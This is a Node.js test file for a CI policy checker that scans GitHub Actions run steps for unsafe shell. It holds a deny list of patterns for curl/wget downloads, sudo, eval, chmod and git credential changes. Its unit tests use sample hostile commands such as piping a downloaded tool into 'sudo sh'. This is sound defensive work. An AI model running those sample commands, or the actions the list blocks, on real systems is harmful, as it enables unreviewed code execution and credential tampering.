import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

const WEBCLIENT_ROOT = path.resolve(import.meta.dirname, '..');
const REPO_ROOT = path.resolve(WEBCLIENT_ROOT, '..');

const WORKFLOWS = Object.freeze([
  '.github/workflows/webclient-quality.yml',
  '.github/workflows/release-evidence-contract.yml',
]);

const FORBIDDEN_COMMANDS = Object.freeze([
  Object.freeze({ code: 'remote-download', pattern: /(^|[;&|()\s])(?:curl|wget)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'privilege-escalation', pattern: /(^|[;&|()\s])sudo(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'dynamic-eval', pattern: /(^|[;&|()\s])eval(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'dynamic-source', pattern: /(^|[;&|()\s])(?:source|\.)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'unsafe-npm-install', pattern: /(^|[;&|()\s])npm\s+(?:i|install)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'global-package-install', pattern: /(^|[;&|()\s])(?:npm|pnpm|yarn)\b[^\n]*\s(?:-g|--global)(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'shell-permission-mutation', pattern: /(^|[;&|()\s])chmod(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'shell-ownership-mutation', pattern: /(^|[;&|()\s])chown(?=$|[;&|()\s])/i }),
  Object.freeze({ code: 'git-credential-mutation', pattern: /(^|[;&|()\s])git\s+config\b[^\n]*(?:credential|http\..*extraheader)/i }),
]);

function readWorkflow(relativePath) {
  return fs.readFileSync(path.join(REPO_ROOT, relativePath), 'utf8');
}

function indentation(line) {
  return line.length - line.trimStart().length;
}

function stripYamlScalar(value) {
  const trimmed = String(value ?? '').trim();
  if (trimmed.length >= 2) {
    const first = trimmed[0];
    const last = trimmed.at(-1);
    if ((first === '"' && last === '"') || (first === "'" && last === "'")) {
      return trimmed.slice(1, -1);
    }
  }
  return trimmed;
}

function shellBlocks(text) {
  const source = String(text ?? '').split(/\r?\n/);
  const blocks = [];

  for (let index = 0; index < source.length; index += 1) {
    const line = source[index];
    const match = line.match(/^(\s*)(?:-\s*)?run:\s*(.*)$/);
    if (!match) continue;

    const runIndent = indentation(line);
    const rawValue = match[2].trim();
    const lineNumber = index + 1;

    if (rawValue === '|' || rawValue === '>' || rawValue === '|-' || rawValue === '>-') {
      const body = [];
      for (let cursor = index + 1; cursor < source.length; cursor += 1) {
        const candidate = source[cursor];
        if (!candidate.trim()) {
          body.push('');
          continue;
        }
        if (indentation(candidate) <= runIndent) break;
        body.push(candidate.slice(Math.min(candidate.length, runIndent + 2)));
      }
      blocks.push(Object.freeze({ line: lineNumber, command: body.join('\n'), multiline: true }));
      continue;
    }

    blocks.push(Object.freeze({
      line: lineNumber,
      command: stripYamlScalar(rawValue),
      multiline: false,
    }));
  }

  return blocks;
}

function containsCommandSubstitution(command) {
  return /\$\([^)]*\)|`[^`]*`/.test(command);
}

function containsProcessSubstitution(command) {
  return /(?:<|>)\([^)]*\)/.test(command);
}

function containsBackgroundExecution(command) {
  return /(^|[^&])&($|[^&])/.test(command);
}

function containsShellPipeline(command) {
  return /(^|[^|])\|($|[^|])/.test(command);
}

function containsShellRedirection(command) {
  return /(^|\s)(?:>>?|<<?)(?=\s*[^=])/.test(command);
}

function containsUntrustedExpression(command) {
  const expressions = command.match(/\$\{\{[\s\S]*?\}\}/g) ?? [];
  return expressions.some((expression) =>
    /github\.event\.|github\.head_ref|github\.event_name|inputs\.|vars\.|secrets\./i.test(expression),
  );
}

function auditShellBlock(block) {
  const findings = [];
  const command = block.command;

  if (!command.trim()) findings.push('empty-run');
  if (block.multiline) findings.push('multiline-shell');
  if (containsCommandSubstitution(command)) findings.push('command-substitution');
  if (containsProcessSubstitution(command)) findings.push('process-substitution');
  if (containsBackgroundExecution(command)) findings.push('background-execution');
  if (containsShellPipeline(command)) findings.push('shell-pipeline');
  if (containsShellRedirection(command)) findings.push('shell-redirection');
  if (containsUntrustedExpression(command)) findings.push('untrusted-expression');

  for (const rule of FORBIDDEN_COMMANDS) {
    if (rule.pattern.test(command)) findings.push(rule.code);
  }

  return [...new Set(findings)];
}

function auditWorkflowShell(text) {
  const findings = [];
  for (const block of shellBlocks(text)) {
    for (const code of auditShellBlock(block)) {
      findings.push(Object.freeze({ code, line: block.line }));
    }
  }
  return findings;
}

for (const workflow of WORKFLOWS) {
  test(`${workflow} keeps release shell execution deterministic and offline`, () => {
    assert.deepEqual(
      auditWorkflowShell(readWorkflow(workflow)),
      [],
      `${workflow} contains shell behavior outside the reviewed release boundary`,
    );
  });
}

test('parses a compact run step', () => {
  assert.deepEqual(shellBlocks('steps:\n  - run: npm ci\n'), [
    Object.freeze({ line: 2, command: 'npm ci', multiline: false }),
  ]);
});

test('parses a named run step', () => {
  const blocks = shellBlocks('steps:\n  - name: Test\n    run: npm test\n');
  assert.equal(blocks.length, 1);
  assert.equal(blocks[0].line, 3);
  assert.equal(blocks[0].command, 'npm test');
});

test('strips matching scalar quotes without changing command semantics', () => {
  assert.equal(shellBlocks('steps:\n  - run: "npm run build"\n')[0].command, 'npm run build');
  assert.equal(shellBlocks("steps:\n  - run: 'npm run build'\n")[0].command, 'npm run build');
});

test('rejects curl and wget remote downloads', () => {
  assert.deepEqual(auditShellBlock({ command: 'curl https://example.invalid/tool', multiline: false }), ['remote-download']);
  assert.deepEqual(auditShellBlock({ command: 'wget https://example.invalid/tool', multiline: false }), ['remote-download']);
});

test('does not confuse command names containing curl with curl itself', () => {
  assert.deepEqual(auditShellBlock({ command: 'node scripts/curl-audit.mjs', multiline: false }), []);
});

test('rejects privilege escalation', () => {
  assert.deepEqual(auditShellBlock({ command: 'sudo apt-get update', multiline: false }), ['privilege-escalation']);
});

test('rejects eval and source based dynamic execution', () => {
  assert.deepEqual(auditShellBlock({ command: 'eval "$COMMAND"', multiline: false }), ['dynamic-eval']);
  assert.deepEqual(auditShellBlock({ command: 'source ./ci.env', multiline: false }), ['dynamic-source']);
});

test('rejects npm install aliases while preserving npm ci', () => {
  assert.deepEqual(auditShellBlock({ command: 'npm install', multiline: false }), ['unsafe-npm-install']);
  assert.deepEqual(auditShellBlock({ command: 'npm i', multiline: false }), ['unsafe-npm-install']);
  assert.deepEqual(auditShellBlock({ command: 'npm ci', multiline: false }), []);
});

test('rejects global package installation', () => {
  assert.ok(auditShellBlock({ command: 'npm install -g pnpm', multiline: false }).includes('global-package-install'));
});

test('rejects permission and ownership mutation', () => {
  assert.deepEqual(auditShellBlock({ command: 'chmod +x tool.sh', multiline: false }), ['shell-permission-mutation']);
  assert.deepEqual(auditShellBlock({ command: 'chown root tool.sh', multiline: false }), ['shell-ownership-mutation']);
});

test('rejects git credential and extraheader mutation', () => {
  assert.deepEqual(auditShellBlock({ command: 'git config credential.helper store', multiline: false }), ['git-credential-mutation']);
  assert.deepEqual(auditShellBlock({ command: 'git config http.https://github.com/.extraheader AUTHORIZATION', multiline: false }), ['git-credential-mutation']);
});

test('rejects command substitution in both shell forms', () => {
  assert.deepEqual(auditShellBlock({ command: 'echo $(git rev-parse HEAD)', multiline: false }), ['command-substitution']);
  assert.deepEqual(auditShellBlock({ command: 'echo `git rev-parse HEAD`', multiline: false }), ['command-substitution']);
});

test('rejects process substitution', () => {
  assert.deepEqual(auditShellBlock({ command: 'diff <(one) <(two)', multiline: false }), ['process-substitution']);
});

test('rejects background execution but permits fail-fast && chaining', () => {
  assert.deepEqual(auditShellBlock({ command: 'npm test & npm run build', multiline: false }), ['background-execution']);
  assert.deepEqual(auditShellBlock({ command: 'npm test && npm run build', multiline: false }), []);
});

test('rejects shell pipelines but does not confuse logical OR', () => {
  assert.deepEqual(auditShellBlock({ command: 'cat file | grep token', multiline: false }), ['shell-pipeline']);
  assert.deepEqual(auditShellBlock({ command: 'node check.mjs || exit 1', multiline: false }), []);
});

test('rejects output and input redirection', () => {
  assert.deepEqual(auditShellBlock({ command: 'node check.mjs > evidence.txt', multiline: false }), ['shell-redirection']);
  assert.deepEqual(auditShellBlock({ command: 'node check.mjs < input.txt', multiline: false }), ['shell-redirection']);
});

test('rejects multiline shell because hidden continuation semantics expand attack surface', () => {
  const [block] = shellBlocks('steps:\n  - run: |\n      npm ci\n      npm test\n');
  assert.equal(block.multiline, true);
  assert.deepEqual(auditShellBlock(block), ['multiline-shell']);
});

test('rejects pull-request event interpolation in shell', () => {
  assert.deepEqual(
    auditShellBlock({ command: 'echo ${{ github.event.pull_request.title }}', multiline: false }),
    ['untrusted-expression'],
  );
});

test('rejects workflow input, variable and secret interpolation in shell', () => {
  for (const expression of ['${{ inputs.target }}', '${{ vars.COMMAND }}', '${{ secrets.TOKEN }}']) {
    assert.deepEqual(auditShellBlock({ command: `echo ${expression}`, multiline: false }), ['untrusted-expression']);
  }
});

test('permits reviewed immutable GitHub metadata that cannot inject shell syntax', () => {
  assert.deepEqual(auditShellBlock({ command: 'echo ${{ github.sha }}', multiline: false }), []);
  assert.deepEqual(auditShellBlock({ command: 'echo ${{ github.ref }}', multiline: false }), []);
});

test('reports multiple independent violations from one run step', () => {
  const findings = auditShellBlock({
    command: 'curl https://example.invalid/tool | sudo sh',
    multiline: false,
  });
  assert.deepEqual(findings, ['shell-pipeline', 'remote-download', 'privilege-escalation']);
});

test('workflow audit preserves source line numbers for actionable CI diagnostics', () => {
  const findings = auditWorkflowShell('steps:\n  - name: unsafe\n    run: wget https://example.invalid/tool\n');
  assert.deepEqual(findings, [Object.freeze({ code: 'remote-download', line: 3 })]);
});

test('workflow audit reports every unsafe run block rather than stopping at first failure', () => {
  const findings = auditWorkflowShell('steps:\n  - run: sudo true\n  - run: npm install\n');
  assert.deepEqual(findings.map((finding) => finding.code), ['privilege-escalation', 'unsafe-npm-install']);
});
